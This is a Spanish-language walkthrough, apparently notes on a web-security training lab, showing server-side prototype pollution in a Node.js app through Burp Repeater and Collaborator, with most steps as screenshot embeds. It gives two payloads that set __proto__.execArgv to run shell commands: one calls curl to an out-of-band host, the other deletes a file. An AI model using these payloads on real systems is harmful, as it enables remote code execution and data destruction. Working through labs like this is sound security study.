![[Pasted image 20230602174822.png]]

![[Pasted image 20230602180718.png]]

	payloads:
"__proto__":{
"execArgv":[
	"--eval=require('child_process').execSync('curl https://YOUR-COLABORATORI-ID.oastify.com')"
]
}

"__proto__":{
"execArgv":[
	"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
]
}

hoy al lab, me logeo y actualizo los datos, luego me voy al history:

![[Pasted image 20230602181342.png]]

![[Pasted image 20230602181425.png]]

![[Pasted image 20230602181452.png]]

![[Pasted image 20230602181515.png]]

notese que aca tengo acceso al admin panel:

![[Pasted image 20230602181541.png]]

![[Pasted image 20230602181602.png]]

me regreso al admin panel y chequeo el history:

![[Pasted image 20230602181728.png]]

paso al repeater y le pongo el primer payload:

![[Pasted image 20230602181852.png]]

ACA ME VOY AL BURP COLLABORATOr y le pego el url:

![[Pasted image 20230602181923.png]]

![[Pasted image 20230602181956.png]]

![[Pasted image 20230602182013.png]]

me paso al burp collab client y presiono poll now, notese que no hay hits, inmediatametne me paso a ejecutar las rutinas de mtto del lab y ahora fallan:


![[Pasted image 20230602182142.png]]****

![[Pasted image 20230602182201.png]]

una vez que fallaron si aparecen interacciones, pego el segundo payload:

![[Pasted image 20230602182326.png]]

![[Pasted image 20230602182342.png]]

luego me paso al lab, regreso a los procesos de mantenimiento y los ejecuto

![[Pasted image 20230602182424.png]]

![[Pasted image 20230602182447.png]]

